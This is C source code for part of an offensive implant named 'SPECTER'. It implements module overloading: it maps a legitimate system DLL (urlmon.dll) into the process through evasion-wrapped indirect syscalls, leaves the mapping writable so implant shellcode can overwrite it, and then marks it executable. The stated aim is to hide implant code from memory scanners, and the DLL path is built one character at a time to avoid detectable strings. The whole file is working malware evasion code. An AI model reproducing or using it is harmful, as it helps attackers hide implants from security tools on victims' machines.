/**
 * SPECTER Implant — Module Overloading via NtCreateSection
 *
 * Opens a benign system DLL (urlmon.dll), creates a SEC_IMAGE section
 * from it via NtCreateSection, and maps the section into the current
 * process.  The caller can then overwrite the mapped image with the
 * implant PIC blob, resulting in implant code backed by a legitimate
 * DLL on disk — defeating memory scanners that flag unbacked RX regions.
 *
 * All file/section operations go through the evasion-wrapped syscall
 * engine (evasion_syscall → indirect syscall with stack spoofing).
 */

#include "specter.h"
#include "ntdefs.h"
#include "syscalls.h"
#include "evasion.h"

/* ------------------------------------------------------------------ */
/*  evasion_module_overload                                             */
/* ------------------------------------------------------------------ */

NTSTATUS evasion_module_overload(EVASION_CONTEXT *ctx, PVOID *mapped_base,
                                  PSIZE_T mapped_size) {
    if (!ctx || !mapped_base || !mapped_size)
        return STATUS_INVALID_PARAMETER;

    *mapped_base = NULL;
    *mapped_size = 0;

    NTSTATUS status;
    HANDLE file_handle = NULL;
    HANDLE section_handle = NULL;

    /* ---- Step 1: Build NT path for urlmon.dll on the stack ---- */
    /* \??\C:\Windows\System32\urlmon.dll — built as char array to
       avoid string literals in .rdata */
    WCHAR dll_path[44];
    dll_path[0]  = '\\';
    dll_path[1]  = '?';
    dll_path[2]  = '?';
    dll_path[3]  = '\\';
    dll_path[4]  = 'C';
    dll_path[5]  = ':';
    dll_path[6]  = '\\';
    dll_path[7]  = 'W';
    dll_path[8]  = 'i';
    dll_path[9]  = 'n';
    dll_path[10] = 'd';
    dll_path[11] = 'o';
    dll_path[12] = 'w';
    dll_path[13] = 's';
    dll_path[14] = '\\';
    dll_path[15] = 'S';
    dll_path[16] = 'y';
    dll_path[17] = 's';
    dll_path[18] = 't';
    dll_path[19] = 'e';
    dll_path[20] = 'm';
    dll_path[21] = '3';
    dll_path[22] = '2';
    dll_path[23] = '\\';
    dll_path[24] = 'u';
    dll_path[25] = 'r';
    dll_path[26] = 'l';
    dll_path[27] = 'm';
    dll_path[28] = 'o';
    dll_path[29] = 'n';
    dll_path[30] = '.';
    dll_path[31] = 'd';
    dll_path[32] = 'l';
    dll_path[33] = 'l';
    dll_path[34] = '\0';

    UNICODE_STRING us_path;
    us_path.Buffer        = dll_path;
    us_path.Length        = 34 * sizeof(WCHAR);  /* 34 chars */
    us_path.MaximumLength = 35 * sizeof(WCHAR);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    /* ---- Step 2: Open the sacrificial DLL via NtCreateFile ---- */
    IO_STATUS_BLOCK iosb;
    spec_memset(&iosb, 0, sizeof(iosb));

    status = spec_NtCreateFile(
        &file_handle,
        FILE_READ_DATA | FILE_READ_ATTRIBUTES | SYNCHRONIZE,
        &oa,
        &iosb,
        NULL,                           /* AllocationSize */
        0,                              /* FileAttributes */
        FILE_SHARE_READ,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,                           /* EaBuffer */
        0                               /* EaLength */
    );

    if (!NT_SUCCESS(status))
        return status;

    /* ---- Step 3: Create SEC_IMAGE section from the DLL ---- */
    status = spec_NtCreateSection(
        &section_handle,
        SECTION_ALL_ACCESS,
        NULL,                           /* ObjectAttributes */
        NULL,                           /* MaximumSize (whole file) */
        PAGE_READONLY,
        SEC_IMAGE,
        file_handle
    );

    /* Close file handle — no longer needed after section creation */
    spec_NtClose(file_handle);
    file_handle = NULL;

    if (!NT_SUCCESS(status))
        return status;

    /* ---- Step 4: Map the section into our process ---- */
    PVOID   view_base = NULL;
    SIZE_T  view_size  = 0;
    HANDLE  current_process = (HANDLE)(ULONG_PTR)-1;

    status = spec_NtMapViewOfSection(
        section_handle,
        current_process,
        &view_base,
        0,                              /* ZeroBits */
        0,                              /* CommitSize */
        NULL,                           /* SectionOffset */
        &view_size,
        ViewShare,
        0,                              /* AllocationType */
        PAGE_READWRITE
    );

    /* Close section handle regardless of map result */
    spec_NtClose(section_handle);

    if (!NT_SUCCESS(status))
        return status;

    /* ---- Step 5: Return mapped region to caller ---- */
    *mapped_base = view_base;
    *mapped_size = view_size;

    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  evasion_module_overload_finalize — flip RW → RX after PIC copy      */
/* ------------------------------------------------------------------ */

NTSTATUS evasion_module_overload_finalize(EVASION_CONTEXT *ctx, PVOID base, SIZE_T size) {
    (void)ctx;
    DWORD old_protect;
    SIZE_T region_size = size;
    PVOID region_base = base;
    return spec_NtProtectVirtualMemory((HANDLE)-1, &region_base, &region_size,
                                        PAGE_EXECUTE_READ, &old_protect);
}
